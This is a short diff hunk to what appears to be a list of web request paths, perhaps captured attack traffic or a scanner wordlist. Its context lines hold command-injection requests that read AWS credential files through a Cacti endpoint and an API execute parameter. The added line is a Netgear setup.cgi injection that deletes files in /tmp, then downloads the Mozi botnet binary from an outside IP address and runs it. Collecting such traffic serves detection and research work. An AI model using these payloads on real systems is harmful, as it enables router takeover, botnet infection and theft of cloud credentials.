@@ -16864,3 +16864,4 @@ http://www.chinaso.com/?0.145715933928683196010916160
 /cacti/cmd_realtime.php?1+1&&cat+~/.aws/credentials+1+1+1
 /api/v1/execute?cmd=cat+/root/.aws/credentials
 /src/getSettings.rsb?@json
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.235.177.156:59922/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
